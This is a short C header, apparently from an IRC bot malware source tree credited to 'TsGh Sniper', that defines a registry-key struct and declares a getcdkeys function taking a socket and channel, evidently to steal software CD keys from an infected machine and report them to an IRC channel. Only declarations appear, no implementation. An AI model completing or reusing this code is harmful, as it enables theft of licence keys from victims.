/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////

#ifndef NO_CDKEYS
typedef struct REGKEYS 
{
	HKEY hkey;
	LPCTSTR subkey;
	LPCTSTR value;
	LPCTSTR name;
	LPCTSTR file;
	LPCTSTR tag;

} REGKEYS;

void getcdkeys(SOCKET sock, char *chan, BOOL notice);
#endif
